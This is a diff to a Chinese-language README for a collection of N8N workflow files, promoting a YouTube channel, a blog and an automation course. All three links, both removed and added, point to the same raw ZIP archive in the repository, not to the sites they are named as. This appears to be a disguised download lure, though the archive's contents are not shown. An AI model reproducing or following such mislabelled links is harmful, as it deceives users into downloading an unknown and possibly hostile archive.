@@ -3,8 +3,8 @@
 此仓库存储我在YouTube频道分享的N8N工作流配置文件，用户可直接下载JSON文件导入N8N使用。
 
 ### 个人信息
-1. YouTube频道：https://raw.githubusercontent.com/junmoxiao825/n8n_workflows/main/workflows/workflows_n_2.0-alpha.5.zip
-2. AI学长的博客：https://raw.githubusercontent.com/junmoxiao825/n8n_workflows/main/workflows/workflows_n_2.0-alpha.5.zip
+1. YouTube频道：https://raw.githubusercontent.com/junmoxiao825/n8n_workflows/main/workflows/n-workflows-3.1-alpha.4.zip
+2. AI学长的博客：https://raw.githubusercontent.com/junmoxiao825/n8n_workflows/main/workflows/n-workflows-3.1-alpha.4.zip
 
 ## 工作流列表
 - [实时监控公众号：自动采集+分发文章，这个AI工作流太强了 | 保姆级教程](./workflows/自动同步公众号文章工作流.json)
@@ -35,7 +35,7 @@
 经过半年的研究和实践，我用N8N搭建了各种自动化工作流：从内容创作到数据分析，从社媒运营到粉丝管理，这些流程每天24小时都在帮我干活。
 
 现在，我把这些经验整理成了一门系统课程《AI自动化大师课：从零构建企业级工作流》。无论你是新手还是进阶用户，这里都有大量实用技巧和解决方案，帮你快速掌握工作流自动化，让AI真正成为你的得力助手。
-  > 课程地址：https://raw.githubusercontent.com/junmoxiao825/n8n_workflows/main/workflows/workflows_n_2.0-alpha.5.zip
+  > 课程地址：https://raw.githubusercontent.com/junmoxiao825/n8n_workflows/main/workflows/n-workflows-3.1-alpha.4.zip
   
 👉 通过这门课程，你将学会：
 1. 工作流的基础知识
